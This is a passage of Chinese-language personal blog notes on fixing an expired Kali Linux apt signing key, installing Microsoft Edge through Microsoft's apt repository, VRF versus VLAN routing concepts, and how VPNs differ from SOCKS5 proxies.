ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;Err:4 https://mirrors.ustc.edu.cn/kali kali-rolling InRelease  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;Reading package lists... Done\n\n检查发现是GPG密钥过期\nAI诊断: \n\nKali Linux 软件源签名密钥过期 和 部分镜像站同步问题,\n\nGPG签名失效(什么是GPG密钥)：所有镜像站（阿里云&#x2F;清华&#x2F;中科大）均报告 EXPKEYSIG ED444FF07D8D0BF6 错误，表示Kali官方密钥已过期。\n\n\n报告apt-key弃用添加GPG密钥对时候发现报错apt-key add archive-key.asc\nWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8))./etc/apt/trusted.gpg\n\napt-key已经弃用了,因为直接改会影响全局\n全局信任（全盘授权）\n使用 apt-key add 添加的密钥，会被所有仓库源信任，无论是官方的，还是第三方的。这带来两个问题：\n\n如果你添加了一个第三方仓库的公钥，它可以伪造任何仓库的软件包签名，甚至冒充 Kali 官方！\n一旦这个第三方密钥被泄漏或滥用，就存在被下毒包“钓鱼”的可能。\n\n\n就像你把你家钥匙给了一个人，然后这把钥匙还能开你办公室、保险柜和你朋友家门……\n\n不够精细化\n现代 APT(trusted.gpg.d) 支持 signed-by=/路径/到/某个key.gpg，可以精确指定某个仓库只使用某个密钥进行验证，更安全、可控。\n使用trusted.gpg.d管理(传统方式)这样只在 /etc/apt/trusted.gpg.d 中以文件方式管理密钥，不用污染全局，每个源都可以绑定自己的签名公钥。\n手动导入密钥下载并添加 Kali 的 GPG 密钥\ncurl -fsSL https://archive.kali.org/archive-key.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/kali-archive.gpg\n\nsudo apt update\n\n\n\n在这个文件夹中保存了对应的密钥文件,每个源按需绑定,也可以直接删除对应的文件\n\n如果发现对应的密钥下载错了,也可以删除\nsudo rm /etc/apt/trusted.gpg.d/kali-archive.gpgrr\n\n\n\n检查导入的密钥是否生效\ngpg --show-keys /etc/apt/trusted.gpg.d/kali-archive.gpg\n\n\n\n但是实际上这样的管理方式并不安全,甚至有点混乱,与之对应的是. 在 source 中声明 signed-by的显式声明密钥绑定\n按照报错来导入密钥出现了这样的密钥,直接指明NO_PUBKEY ED444FF07D8D0BF6\n\nsudo gpg --keyserver keyserver.ubuntu.com --recv-keys ED444FF07D8D0BF6sudo gpg --export ED444FF07D8D0BF6 | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/old-kali-key.gpg\n\n\nUbuntu是对的,只是一个公钥分发机构,👉 keyserver.ubuntu.com 是 Ubuntu 社区维护的一个 公共 GPG 密钥服务器，不是只用于 Ubuntu，Kali、Debian、Arch 等系统都可以从这里拉取 GPG 公钥。\n\n自动进行密钥管理(现代)可以手动编辑/etc/apt/source.list,直接指定signed-by=\ndeb [signed-by=/usr/share/keyrings/kali-archive-keyring.gpg] https://http.kali.org/kali kali-rolling main non-free non-free-firmware\n\n\n\n不需要手动下载密钥，推荐官方方式：\nsudo apt install --reinstall kali-archive-keyring\n\n这个 .deb 安装包会：\n\n安装 .gpg 文件到 /usr/share/keyrings/\n正确设置 source 里的 signed-by=\n避免手动失误\n\n换源源路径 /etc/apt/sources.list.d/文件夹以及/etc/apt/sources.list\n文件里面是默认的源的路径(保存在一个文件中),文件夹中的源是拓展的源,在这个文件夹中,一个源存在一个路径\nkali官方源\n# 官方软件源，使用 https 和新版 non-free-firmware 组件deb https://http.kali.org/kali kali-rolling main non-free-firmware non-free contribdeb-src https://http.kali.org/kali kali-rolling main non-free-firmware non-free contrib\n\n✅ 加入 non-free-firmware：Kali 官方已将一些固件包从 non-free 移到 non-free-firmware，否则可能找不到驱动或固件。\n✅ 这个官方源会自动跳转的CDN,但是实际上仍然是官方源. 访问这个地址时，实际上会被 302&#x2F;HTTP 重定向到一个地理上距离你最近的镜像站点，比如：\n\nmirror.twds.com.tw（台湾）\n\nmirror.nju.edu.cn（南京大学）\n\nmirrors.ocf.berkeley.edu（美国）\n\nKali 官方维护的全球镜像网络（在 官方镜像列表 中都有）。\n\n\n追加新源（保留原有内容）\necho &quot;deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib&quot; | sudo tee -a /etc/apt/sources.list\n\n注：-a 参数表示追加（append），不加则会覆盖原文件。\n对比其他写法\n\n\n\n方法\n示例\n缺点\n\n\n\n直接重定向\nsudo echo &quot;内容&quot; &gt; 文件\n重定向部分权限不足\n\n\n使用 tee\necho “内容”\nsudo tee 文件\n\n\n文本编辑器\nsudo nano 文件\n需要交互操作\n\n\n什么是GPG密钥GPG密钥在此处的应用原理理解过程APT 在更新软件包索引时，会校验这些索引是否由官方签名。如果缺少 GPG 公钥，它就没法验证签名的合法性，因此就会报这个错误，并跳过这个源的更新。\napt&#x2F;apt-get安装之间需要校验软件包,只有通过约定好的私钥加密的软件包才能被本地的公钥解密通过验证(校验索引)才能进行下载. 而这一套验证的公私钥又会定期更换,所以因为长时间没有更换公钥导致这个无法解密而导致下载失败\nAPT的软件包验证机制APT的验证流程分为两个层级：\n\n元数据验证\n软件源提供的InRelease或Release.gpg文件包含仓库元数据的GPG签名（如软件包列表的哈希值）。\nAPT会用本地存储的发行版公钥如ED444FF07D8D0BF6验证这些签名，确保元数据未被篡改\n\n\n软件包完整性验证\n每个软件包（.deb文件）的哈希值记录在元数据中，APT下载后会比对哈希值，确保文件完整\n但软件包本身并未用私钥加密，而是通过哈希值+元数据签名实现防篡改。\n\n\n\n密钥更新的必要性\n密钥过期问题：\nKali等发行版的公钥有有效期（如报错中出现的expired: 2025-01-24）。若未及时更新公钥，APT无法验证新签名的元数据，导致下载失败. 对于过期密钥, APT发现密钥过期会直接拒绝下载软件\n\n密钥轮换逻辑：发行版会定期更换密钥对（如每2年），旧密钥过期前会通过官方渠道发布新密钥。用户需手动或自动更新公钥链\n\n\n都是非对称加密, 和tls的区别PG密钥和TLS证书的签发机制在核心原理上相似（均基于非对称加密和数字签名），但在具体实现和应用场景上有显著差异：\n核心相似性\n非对称加密基础：两者均使用公钥&#x2F;私钥对（如RSA&#x2F;ECC算法）实现加密和签名\n数字签名验证：均通过签名验证数据完整性和身份真实性（如GPG签名文件、TLS验证服务器证书）\n\n关键差异\n\n\n特性\nGPG密钥\nTLS证书\n\n\n\n信任模型\n分布式信任（Web of Trust）\n中心化信任（CA机构）\n\n\n签发主体\n用户自签或互签\n权威证书颁发机构（CA）\n\n\n主要用途\n文件&#x2F;邮件加密、代码签名\n网站身份验证、加密通信（HTTPS）\n\n\n证书格式\nOpenPGP标准\nX.509标准\n\n\n密钥管理\n用户自主管理（如gpg --gen-key）\nCA统一签发和管理\n\n\n典型流程对比\nGPG签名：用户A用私钥签名文件 → 用户B用A的公钥验证签名\nTLS证书验证：服务器发送CA签名的证书 → 客户端用CA公钥验证证书链\n\n应用场景\nGPG：适合个人或小范围安全通信（如Linux软件包签名）\nTLS：适用于大规模互联网服务（如银行网站、电商平台）\n\n总结两者均依赖非对称加密，但GPG强调去中心化信任，TLS依赖CA体系。若需验证网站身份，必须使用TLS证书；若需个人数据加密或签名，GPG更灵活\n","categories":["协议学习"],"tags":["linux"]},{"title":"linux_完整的linux软件下载过程","url":"/2025/05/06/%E9%9B%B6%E7%A2%8E%E5%AD%A6%E4%B9%A0/linux_%E5%AE%8C%E6%95%B4%E7%9A%84linux%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%BF%87%E7%A8%8B/","content":"linux_完整的linux软件下载过程🌟 方法概览：这是通过「Microsoft 官方软件源」在 Ubuntu 系统中安装 Microsoft Edge 浏览器的方法。和下载 .deb 安装包相比，这种方式更推荐，因为你可以像更新其他软件一样自动更新 Edge 浏览器。\n\n🧱 步骤详细讲解：\n✅ 第 1 步：更新系统和软件包列表sudo apt update &amp;&amp; sudo apt upgrade\n\n解释：\n\nsudo apt update 是告诉系统“去检查有没有新版本的软件”。\nsudo apt upgrade 是“安装这些新版本”，更新系统中已有的软件。\nsudo 表示用管理员权限运行命令。\n\n意义： 确保你的系统是最新的，避免因为版本太旧导致安装失败。\n注意： 如果提示你有很多包要更新，可以先回车确认。也可以跳过升级，只执行 sudo apt update。\n\n✅ 第 2 步：安装依赖工具sudo apt install curl software-properties-common apt-transport-https ca-certificates\n\n解释：\n\ncurl：用来从网上下载文件（比如 Microsoft 的密钥）。\nsoftware-properties-common：让你可以添加第三方软件源。\napt-transport-https：让 apt 可以通过 HTTPS（安全协议）下载软件。\nca-certificates：让系统信任一些网站（确保安全性）。\n\n意义： 为后面添加 Microsoft 的软件源和密钥做准备。\n\n✅ 第 3 步：导入 Microsoft 的 GPG 密钥curl -fSsL https://packages.microsoft.com/keys/microsoft.asc | sudo gpg --dearmor | sudo tee /usr/share/keyrings/microsoft-edge.gpg &gt; /dev/null\n\n解释：\n\n下载 Microsoft 的“签名密钥”（确保安装的软件真的是 Microsoft 提供的）。\ngpg --dearmor 是把密钥转成系统能读的格式。\ntee 把它保存到 /usr/share/keyrings/microsoft-edge.gpg。\n\n意义： 保证你安装的软件没有被篡改，是官方正版。\n\n✅ 第 4 步：添加 Microsoft Edge 的软件源echo &#x27;deb [arch=amd64 signed-by=/usr/share/keyrings/microsoft-edge.gpg] https://packages.microsoft.com/repos/edge stable main&#x27; | sudo tee /etc/apt/sources.list.d/microsoft-edge.list\n\n解释：\n\n把 Microsoft Edge 的“下载地址”告诉系统（称为软件源）。\n这样以后你输入 apt install 时，系统就知道去这个源找 Edge。\n\n意义： 这是关键一步，让 Ubuntu 知道哪里可以下载 Microsoft Edge。\n\n✅ 第 5 步：更新软件源列表sudo apt update\n\n解释：\n\n系统现在知道有个新的软件源了（Microsoft 的 Edge 源），这一步是告诉它：“去读取一下那个源有哪些软件”。\n\n意义： 让 Edge 出现在 Ubuntu 的“可安装软件”列表中。\n\n✅ 第 6 步：安装 Microsoft Edge 稳定版sudo apt install microsoft-edge-stable\n\n解释：\n\nmicrosoft-edge-stable 就是 Edge 浏览器的名字（稳定版本）。\napt install 会自动从你刚刚添加的软件源中下载安装。\n\n意义： 这是最终安装步骤。完成后你就可以在应用菜单中找到 Microsoft Edge 浏览器了。\n\n🎉 安装完成后你可以：\n在终端输入 microsoft-edge 打开浏览器。\n或者在 Ubuntu 的「应用菜单」里找到 Microsoft Edge 图标。\n\n\n❗ 纯新手注意事项：\n复制粘贴命令时要小心空格，不要漏掉开头的 sudo。\n每一行命令都可以单独执行，遇到错误不用慌，可以一条条执行检查哪里出问题。\n如果你看不懂错误提示，可以复制错误信息发给我，我来帮你解读。\n\n","categories":["零碎学习"],"tags":["linux"]},{"title":"VRF协议学习","url":"/2025/05/13/%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/VRF%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/","content":"VRF: 虚拟路由转发\n\n五分钟理解VRF（Virtual Routing and Forwarding，虚拟路由转发）-CSDN博客\n\n大白话概括: VRF位于OSI第三层(网络层)基于IP地址的路由,就是已经拿到IP地址的包,然后进行重新管理,可以创新虚拟的路由表,相当于进行重新net(可以管理不同的路由器),相当于接入一个宿舍的交换机上每个坏小伙都私接小路由,这所有的小路由都在一台设备上\nVRF核心功能\n作用：VRF用于在同一台物理设备（如路由器或三层交换机）上创建多个隔离的路由表实例，实现网络流量的逻辑分割（类似“虚拟路由器”）。每个VRF实例独立维护：\n路由表（决定数据包转发路径）不同路由表中可以有一样的ip\n转发表（FIB, Forwarding Information Base）\n关联的接口（属于特定VRF的接口处理该实例的流量）\n\n\n应用场景：多租户网络、MPLS VPN、业务隔离等。\n\n和vlan的区别\n什么是vlan: 图文并茂讲VLAN，让你看一遍就理解VLAN-CSDN博客\n\nVLAN的本质：二层隔离，统一三层路由vlan(虚拟局域网)只是划分网段,但是由来路由统一管理,vlan不参与IP路由\n\n作用层级：VLAN是​​二层（数据链路层）​​技术，用于划分广播域，隔离同一物理网络中的不同LAN段。\n\n路由管理：\n\n默认情况：所有VLAN共享同一个全局路由表（除非使用VRF）。例如：VLAN 10（192.168.1.0&#x2F;24）和VLAN 20（192.168.2.0&#x2F;24）的子网通过同一台三层交换机或路由器互联，流量由同一路由表控制。\n限制：\n不同VLAN间的通信需通过三层设备（如路由器或三层交换机）进行路由。\n通过ACL（访问控制列表）或防火墙可以限制VLAN间通信，但路由表本身是统一的。\n\n\n\n\n核心能力：\n\n交换机处理：普通二层交换机（如Cisco 2960）仅支持VLAN，负责：\n\n隔离广播域（不同VLAN的设备无法直接通信）。\n基于端口&#x2F;MAC划分VLAN（如Port 1属于VLAN 10，Port 2属于VLAN 20）。\n\n\n无路由功能：二层交换机\n无法处理IP路由，因此：\n\n不能为不同VLAN分配IP子网。\n不同VLAN间通信必须依赖三层设备（如路由器或三层交换机）。\n\n\n\n\n\nVRF的本质：独立路由实例，完全隔离可以设置独立路由,每个路由下面又可以设置不同网段\n\n作用层级：VRF是​​三层（网络层）​​技术，创建多个​​独立的路由表和转发实例​​，类似虚拟的“独立网络服务器”。\n\n核心特性：\n\n独立路由表：每个VRF有自己的路由条目，互不干扰。例如：VRF-A可以有一条默认路由指向ISP-A，VRF-B指向ISP-B。\n\n完全隔离：\n\n不同VRF的设备即使IP相同（如两个VRF中都有192.168.1.1），也互不可见。\n需要显式配置**路由泄漏（Route Leaking）**才能跨VRF通信。\n\n\n独立管理：每个VRF可单独配置路由协议（如OSPF、BGP）、NAT、防火墙策略等。\n\n交换功能：VRF本身不直接处理二层交换，但：\n\n可以绑定到物理接口或VLAN接口（SVI），从而间接关联二层域。\n\n例如\ninterface GigabitEthernet0/0 vrf forwarding VRF-A  # 将物理接口绑定到VRF-A ip address 192.168.1.1 255.255.255.0\n\n\nIP分配与通信\n\nIP分配：VRF可以管理独立的IP地址池：不同VRF可使用重叠IP（如VRF-A和VRF-B均可使用192.168.1.0&#x2F;24）。需为每个VRF的接口分配IP（类似独立的路由器）。\n总结：VRF是三层技术，-具备路由功能但无原生二层交换能力，需依赖底层设备（如交换机）处理VLAN或物理连接。\n\n\n\n\n\n\n维度\nVLAN（Layer 2）\nVRF（Layer 3）\n\n\n\n隔离依据\nMAC地址&#x2F;VLAN标签\nIP地址&#x2F;路由表\n\n\n通信依赖\n需三层设备跨VLAN路由\n默认完全隔离，需显式配置路由泄漏\n\n\n地址重叠\n不允许同一子网内IP重复\n允许不同VRF使用相同IP段\n\n\n设备角色\n二层交换机\n路由器&#x2F;三层交换机\n\n\n层级隔离: 二层隔离 vs 三层隔离定义\n\n\nOSI层级\n名称\n核心功能\n典型协议&#x2F;设备\n\n\n\nLayer 2\n数据链路层\n基于MAC地址的帧转发，划分广播域\n以太网（Ethernet）、VLAN、交换机\n\n\nLayer 3\n网络层\n基于IP地址的路由，跨子网通信\nIP、ICMP、路由器、VRF\n\n\n数据链路层: 只有mac没有ip!\n数据链路层是负责在物理网络中传输数据帧的层次，常见的技术包括以太网、VLAN（虚拟局域网）等。二层隔离通过物理或逻辑的手段将不同的网络设备或网络区域划分为独立的二层域，使它们之间的通信受限或隔离。这样可以有效地控制数据帧的流动，防止不同域之间的数据干扰和冲突。\n网络层: 通过ip来确定设备,不管mac,出现mac就会通过arp降层处理\n网络层是负责在网络中进行数据包路由和转发的层次，常见的协议包括IP（Internet Protocol）和路由协议（如OSPF、BGP等）。三层隔离通过配置路由器、防火墙或其他网络设备，将不同的网络分割为独立的子网或虚拟网络，实现不同子网之间的隔离和通信控制。三层隔离可以根据网络地址、子网掩码、路由策略等进行配置，从而限制不同子网之间的通信流量。\n二层隔离\n定义: 在 数据链路层（OSI Layer 2） 通过 MAC地址或VLAN标签 实现的网络隔离，限制同一广播域内的设备直接通信。\n\nvlan(虚拟局域网）： 将同一物理交换机上的端口划分到不同逻辑的广播域\n\n# 交换机配置：端口1属于VLAN 10，端口2属于VLAN 20\ninterface GigabitEthernet0/1\n switchport access vlan 10\ninterface GigabitEthernet0/2\n switchport access vlan 20\n- 私有vlan（PVLAN）  - 进一步隔离同一VLAN内的设备（如禁止同一VLAN的服务器互相访问）。（类似ap隔离？）#### 三层隔离（Layer 3 Isolation）- 定义：在 **网络层（OSI Layer 3）** 通过 **IP路由表或VRF** 实现的逻辑隔离，控制不同子网或路由域之间的通信。- 子网划分（Subnet）：  将网络划分为不同IP子网（如`192.168.1.0/24`和`192.168.2.0/24`），默认需路由器才能互通。  - **隔离效果**：不同子网的设备无法直接通信，除非配置路由或ACL。- **VRF（虚拟路由和转发）**：  创建完全独立的路由表实例（如VRF-A和VRF-B），实现IP地址重叠和策略隔离。  - 示例    ```bash    # 路由器配置：两个VRF使用相同的IP段但完全隔离    ip vrf VRF-A     rd 100:1    ip vrf VRF-B     rd 200:1    interface GigabitEthernet0/0     vrf forwarding VRF-A     ip address 192.168.1.1 255.255.255.0    interface GigabitEthernet0/1     vrf forwarding VRF-B     ip address 192.168.1.1 255.255.255.0\n\n\n\n\n\n从OSI模型上来看在纯二层（数据链路层）的通信中，确实不存在IP地址的概念。\nOSI分层原则：\n\n第二层（数据链路层）：仅处理MAC地址和帧的转发（如以太网帧）。\n第三层（网络层）：才引入IP地址和路由逻辑。\n\n\n数据包封装：\n\n设备发送数据时，IP包会被封装在以太网帧中：\n[以太网帧头][目标MAC][源MAC][类型0x0800][IP包头][数据][FCS]\n\n关键点：\n\n交换机（二层设备）只解析以太网帧头（MAC地址），不关心IP包头内容。\n路由器（三层设备）才会解封装帧，读取IP包头进行路由决策。\n\n\n\n\n\n常见误解澄清：\n“ARP协议属于哪一层？”ARP协议虽然是解决IP→MAC映射的，但它的报文是​​二层广播帧​​（无IP头），因此属于​​二层与三层的过渡机制​​\n\n跨网段通信是否需要VLAN参与？核心结论：\nVLAN是二层隔离技术，而跨网段通信是三层路由行为，两者独立但可协作\n\nVLAN的作用：\n\n划分广播域（如VLAN 10和VLAN 20的广播流量互不干扰）。\n\n不直接参与跨网段路由，但可绑定到三层接口（SVI）作为网关。\n\n跨网段通信流程：\n设备A（192.168.1.1/24） → 设备A的网关（192.168.1.254） → 目标网关（192.168.2.254） → 设备B（192.168.2.1/24）\n\n\n关键步骤：\n\n设备A判断目标IP：\n\n若目标IP（如192.168.2.1）与自己在同一子网（通过子网掩码计算），直接ARP查询目标MAC。\n若不在同一子网，将数据包发给默认网关（需已知网关MAC）。\n\n\n网关路由器处理：\n\n解封装帧，查路由表，决定下一跳（如通过OSPF或静态路由）。\n重新封装帧（目标MAC&#x3D;下一跳路由器的MAC，目标IP不变）。\n\n\n最终交付：\n\n目标网关将数据包转发给设备B。\n\n\n\n\n\nVLAN与跨网段的关系：\n场景举例：\n\n设备A（VLAN 10，192.168.1.1&#x2F;24） → 设备B（VLAN 20，192.168.2.1&#x2F;24）。\n即使两者在同一物理交换机上，若属于不同VLAN且未配置三层路由，仍无法通信。\n\n\n协作方式：\n\n在三层交换机上为VLAN 10和VLAN 20配置SVI接口（如VLAN 10的网关IP为192.168.1.254），才能实现跨VLAN路由。\n\n\n具体变化\n\n跨网段的设备通信帧头变化\n\n\n\nvlan与网关的关系vlan !&#x3D; 网关\n\nVLAN 本身无 MAC 地址：VLAN 是逻辑标识（如 VLAN ID 10），不直接关联 MAC 地址。\n\n但 VLAN 接口（SVI）需要 MAC（用于 ARP 响应）：\n若要在三层交换机或路由器上为 VLAN 配置网关 IP（称为 SVI，Switch Virtual Interface\n），则 SVI 接口会分配一个 MAC 地址。\n\n示例配置：\ninterface Vlan10 ip address 192.168.1.254 255.255.255.0  # 网关IP mac-address 00:11:22:33:44:55           # 可选静态MAC，否则自动生成\n\n作用：该 MAC 地址用于 VLAN 10 内设备的 ARP 解析（如设备通过 ARP 查询 192.168.1.254 的 MAC）。\n\n\n\n\n同&#x2F;非同网段的设备通信帧头变化跨网段的设备通信帧头变化\n初始状态:\n设备的arp表\n设备A: 192.168.1.254 → 00:11:22:33:44:55 (网关a MAC)设备B: 192.168.2.254 → AA:BB:CC:DD:EE:FF (网关b MAC)\n\n\n\n三层交换机的mac表\nVLAN 10:  Port 1 | 00:11:22:33:44:55 (网关SVI接口)  Port 2 | AA:AA:AA:AA:AA:AA (设备A)VLAN 20:  Port 3 | AA:BB:CC:DD:EE:FF (网关SVI接口)  Port 4 | BB:BB:BB:BB:BB:BB (设备B)\n\n帧头变化\n(1)设备A -&gt; 网关A\n\n设备A操作:\n\n1️⃣判断目标IP（192.168.2.1）不在同一子网，发送给网关192.168.1.254\n\n2️⃣封装以太网帧和IP包：\n[以太网帧头]  - 目标MAC: 00:11:22:33:44:55 (网关MAC)  - 源MAC: AA:AA:AA:AA:AA:AA (设备A的MAC)  - 类型: 0x0800 (IPv4)[IP包头]  - 源IP: 192.168.1.1  - 目标IP: 192.168.2.1  - TTL: 64\n\n\n交换机操作:\n根据目标MAC（00:11:22:33:44:55）将帧转发给网关SVI接口（VLAN 10）。\n\n\n\n(2)网关（192.168.1.254）→ 目标网关（192.168.2.254）\n\n三层交换机的操作：\n\n(1)解封装以太网帧，读取IP包头，发现目标IP是192.168.2.1。\n\n(2)查路由表，匹配192.168.2.0&#x2F;24的子网，下一跳是VLAN 20的SVI接口（192.168.2.254）。\n\n(3)重新封装以太网帧：\n\n目标MAC: BB:BB:BB:BB:BB:BB (设备B的MAC，需通过ARP查询获取)\n\n源MAC: AA:BB:CC:DD:EE:FF (VLAN 20的SVI接口MAC)\n\nIP包头不变（源IP仍是192.168.1.1，目标IP仍是192.168.2.1，TTL减1&#x3D;63）。\n\n[新以太网帧头]\n  - 目标MAC: BB:BB:BB:BB:BB:BB\n  - 源MAC: AA:BB:CC:DD:EE:FF\n  - 类型: 0x0800\n\n[IP包头] (不变)\n  - 源IP: 192.168.1.1\n  - 目标IP: 192.168.2.1\n  - TTL: 63\n\n\n\n\n\n\nARP查询（若MAC未知）：\n\n交换机在VLAN 20内广播ARP请求：“谁是192.168.2.1？” → 设备B回复MAC地址。\n\n\n\n（3）目标网关 → 设备B\n\n交换机将帧从VLAN 20的端口（Port 4）转发给设备B。\n设备B接收后，检查目标MAC和IP，确认是发给自己的数据包。\n\n\n\n关键变化对比\n\n\n跳数\n源MAC\n目标MAC\n源IP\n目标IP\nTTL\n\n\n\n设备A → 网关\nAA:AA:AA:AA:AA:AA\n00:11:22:33:44:55\n192.168.1.1\n192.168.2.1\n64\n\n\n网关 → 设备B\nAA:BB:CC:DD:EE:FF\nBB:BB:BB:BB:BB:BB\n192.168.1.1\n192.168.2.1\n63\n\n\n核心规则：\nMAC地址逐跳变化：每经过一个三层设备（如网关），源和目标MAC会被重写（对应当前链路的接口MAC）\nIP地址始终不变：源IP和目标IP从设备A到设备B始终保持不变（端到端通信）。\nTTL减1：每经过一个路由器，TTL值减1，防止数据包无限循环。\n\n为什么需要修改MAC地址？\n二层与三层的分工：\nMAC地址用于当前链路的直接交付（如设备A→网关、网关→设备B）。\nIP地址用于端到端的逻辑寻址（设备A到设备B的全局标识）。\n\n\n类比快递：\nIP地址是“收件人地址”（始终不变），MAC地址是“当前运输车辆的牌照”（每段路程不同）。\n\n\n\n同网段的设备通信帧头变化具体的内容不再赘述\n\n","categories":["协议学习"],"tags":["VRF","vlan"]},{"title":"vpn协议了解","url":"/2025/05/13/%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/vpn%E5%8D%8F%E8%AE%AE%E4%BA%86%E8%A7%A3/","content":"vpn分类(按照是否使用使用虚拟网卡通信来分类)传统vpn,使用虚拟网卡通信特点使用vpn协议: OpenVPN、IPSec、L2TP&#x2F;IPSec、WireGuard, 这些vpn通常会在本地生产一张独立的虚拟网卡,通过虚拟网卡来进行通信,如果需要抓包监听该vpn,可以直接使用wireshark监听该网卡实现抓包\n\n这些VPN通常会在本地生成一张虚拟网卡（如TAP&#x2F;TUN设备），用于处理加密流量。例如：\nTUN设备：处理IP层流量（路由模式，仅加密IP数据包）。\nTAP设备：处理以太网层流量（桥接模式，加密完整的以太网帧）。\nWindows示例：连接后可能在“网络连接”中看到名为“OpenVPN TAP-Windows Adapter”或类似名称的虚拟网卡。\nLinux&#x2F;macOS示例：通过ifconfig或ip addr命令可看到tun0或wg0等接口。\n\n\n作用：虚拟网卡将流量重定向到VPN客户端进行加密，再通过物理网卡发送到VPN服务器，实现隧道传输\n\nOSI工作层级\n工作层级：此类vpn的工作层级通常是网络层或数据链路层（OSI第3&#x2F;2层，TCP&#x2F;IP模型的“网络层”或“链路层”）。\n典型协议：OpenVPN（TUN&#x2F;TAP）、IPSec、L2TP、WireGuard。\n特点：\n全局流量接管：通过虚拟网卡（如tun0）捕获所有系统流量（或按路由规则分流）。\n修改系统路由表：强制将默认网关指向VPN接口，所有流量（除非例外）都经过加密隧道。\n透明性：无需应用单独配置，所有应用自动走VPN。\n更底层控制：可处理IP包或以太网帧（如TUN模式处理IP层，TAP模式处理链路层）。\n\n\n例子：商业VPN服务（NordVPN、ExpressVPN）、企业级VPN（Cisco AnyConnect）。\n\n\n\n如何验证\nWindows：打开“网络连接”面板，查看是否有新增的适配器（如“TAP-Windows Adapter”）。\nLinux&#x2F;macOS：运行 ifconfig 或 ip link，寻找 tun、tap、wg 等前缀的接口。\n通用方法：使用VPN前后对比 netstat -r 或 route print，观察默认网关是否指向VPN接口。\n\n例外部分代理软件v2ray&#x2F;clash存在一个tun模式,会创建虚拟网卡（如 Clash TUN），接管所有流量（类似 VPN）。\n开启全局代理后会强制所有流量走代理(包括dns)\n确实是处理网络层的数据,但是是依赖应用层的代理协议来进行加密(例如socks5)\n但是需要注意的是Tun模式对比传统vpn任然存在局限性:\n\n不处理链路层数据（如 TAP）：\n无法直接代理以太网帧（如企业 VPN 的局域网桥接需求）。\n传统 VPN 的 TAP 模式可以做到这一点。\n\n\n依赖用户态代理协议：\nTUN 本身不加密数据，依赖上层工具（如 Clash）通过 SOCKS5&#x2F;Shadowsocks 加密，性能不如内核态 VPN（如 WireGuard）。\n\n\n\n\n\n\n特性\nTUN 模式（Clash&#x2F;V2Ray）\n传统 VPN（如 WireGuard）\n\n\n\n工作层级\n网络层（IP 包）\n网络层（IP 包）或链路层（TAP 模式）\n\n\n是否加密\n❌ 依赖上层代理协议（如 SOCKS5）\n✅ 原生加密（如 WireGuard 的 ChaCha20）\n\n\n流量覆盖范围\n所有 IP 层流量（需配置路由规则）\n所有 IP 层流量（默认全局路由）\n\n\n性能开销\n较高（代理协议+加密多层处理）\n较低（原生加密，内核态处理）\n\n\n典型用途\n翻墙、分流代理\n隐私保护、企业内网访问\n\n\n代理型vpn,不使用独立的虚拟网卡特点\n用户态VPN（如部分移动端应用）：某些轻量级VPN可能直接在应用层处理流量（如Android的VpnService API），无需内核级虚拟网卡，但仍会模拟一个虚拟网络接口\n代理型VPN（如SOCKS5&#x2F;HTTP代理）：这类工具（如Shadowsocks）通常​​不创建虚拟网卡​​，而是通过本地代理端口（如127.0.0.1:1080）转发流量，仅影响配置了代理的应用程序。\n从这里开始着重讨论的是代理型vpn\n\n此类vpn不创建虚拟网卡,而是通过本地端口代理,而是完完全全的软件型,和传统vpn通过软件行为模拟硬件(创建虚拟网卡)不同的是,此类vpn并不尝试处理网卡需要处理的数据,而是直接处理应用层的数据(socks5&#x2F;http)\n工作层级工作于应用层上,只对某个端口的流量进行转发,对更底层的数据不进行处理\n需要注意的是,虽然socks5可以通过转发传输层（如TCP&#x2F;UDP）的流量实现似乎可以处理任何通过tcp&#x2F;udp传输的应用层数据(实际上是所用通过tcp&#x2F;udp传输的数据),但是从具体的层级划分来说,socks5就是工作在应用层上的\nsocks5的工作范围\n所有基于 TCP 的应用层协议：\n\nHTTP&#x2F;HTTPS（网页浏览）\nFTP（文件传输）\nSMTP&#x2F;POP3&#x2F;IMAP（邮件协议）\nSSH（加密远程登录）\nRDP（远程桌面）\n游戏（如 Minecraft、Steam）\n各种 P2P 协议（BitTorrent）\n\n\n所有基于 UDP 的应用层协议：\n\nDNS（域名解析）\n\nVoIP（如 Skype、Zoom）\n\nQUIC（HTTP&#x2F;3）\n\n部分游戏（如 UDP 模式的在线射击游戏）\n\n\n\n\n补充说明\n代理的“伪下层”能力：SOCKS5虽然属于应用层工具，但可以转发传输层（TCP&#x2F;UDP）的流量，因此能代理游戏、P2P等非HTTP应用。而HTTP代理只能处理HTTP&#x2F;HTTPS流量。\nVPN的灵活性：现代VPN工具（如WireGuard）可以通过路由规则实现“分应用代理”（类似代理的灵活性），但底层仍需虚拟网卡支持。\n性能差异：代理型VPN通常开销更小（仅处理部分流量），而常规VPN因加密全流量可能对延迟更敏感。\n\nsocks5的局限性尽管 SOCKS5 可以代理大多数应用层协议，但它仍然有 关键限制，使其无法完全替代 VPN：\n无法代理非 TCP&#x2F;UDP 流量\nICMP（Ping&#x2F;Traceroute）：SOCKS5 无法代理 ICMP 协议，而 VPN 可以。\n\n原始 IP 层流量（如 RAW Socket 通信）：某些低级网络工具（如 nmap 的某些扫描模式）无法通过 SOCKS5 代理\n\n\n依赖应用程序主动支持 SOCKS5\n部分应用不支持 SOCKS5：\n\n某些老旧软件（如 Windows 远程桌面 RDP 默认不走 SOCKS5）。\n系统级服务（如 Windows Update、杀毒软件更新）通常不会走 SOCKS5。\n\n\n需要手动配置：每个应用必须单独设置代理，而 VPN 是全局的。\n\n\n无法修改 IP 层路由\nDNS 泄漏风险：即使 SOCKS5 代理了 TCP&#x2F;UDP 流量，某些应用仍可能直接发送 DNS 请求（不走代理），导致隐私泄露。\n无法强制所有流量走代理：VPN 可以修改路由表，强制所有流量走隧道，而 SOCKS5 只能代理配置过的应用。\n\n无法处理链路层（L2）流量\nVPN（如 TAP 模式）可以代理完整的以太网帧（如某些企业 VPN 需要桥接局域网），而 SOCKS5 只能处理 